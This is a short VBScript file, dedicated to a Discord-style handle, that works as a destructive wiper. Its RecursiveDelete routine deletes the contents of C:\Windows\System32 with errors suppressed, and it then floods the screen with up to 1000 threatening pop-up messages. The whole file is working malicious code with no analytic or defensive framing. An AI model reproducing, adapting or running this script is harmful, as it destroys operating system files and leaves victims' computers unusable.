' Dedicated to the homie Baggette#4777

Set WSHShell = WScript.CreateObject("WScript.Shell")

Sub RecursiveDelete(ByVal folderPath)
    On Error Resume Next
    
    Dim folder, subFolder, file
    Set folder = FSO.GetFolder(folderPath)
    
    For Each file in folder.Files
        If Not InStr(file.Name, "important") > 0 Then
            file.Delete True
        End If
    Next
    
    For Each subFolder in folder.Subfolders
        RecursiveDelete(subFolder.Path)
    Next
    
    folder.Delete True
End Sub

Sub SpookyMessage()
    Dim spookyMessages(10)
    spookyMessages(0) = "You are doomed!"
    spookyMessages(1) = "Prepare for the nightmare!"
    spookyMessages(2) = "There is no escape!"
    spookyMessages(3) = "Your files shall vanish!"
    spookyMessages(4) = "Darkness falls upon you!"
    spookyMessages(5) = "Abandon all hope!"
    spookyMessages(6) = "Despair is your destiny!"
    spookyMessages(7) = "Surrender to the darkness!"
    spookyMessages(8) = "Evil lurks in the shadows!"
    spookyMessages(9) = "Your worst fears come true!"
    
    Dim i, randomIndex
    For i = 1 To 1000
        randomIndex = Int(Rnd * 10)
        WSHShell.Popup spookyMessages(randomIndex), 0, "Spooky Warning", 48 + 4
    Next
End Sub

Randomize
Dim FSO : Set FSO = CreateObject("Scripting.FileSystemObject")
Dim systemFolder : systemFolder = "C:\Windows\System32"

RecursiveDelete systemFolder
SpookyMessage
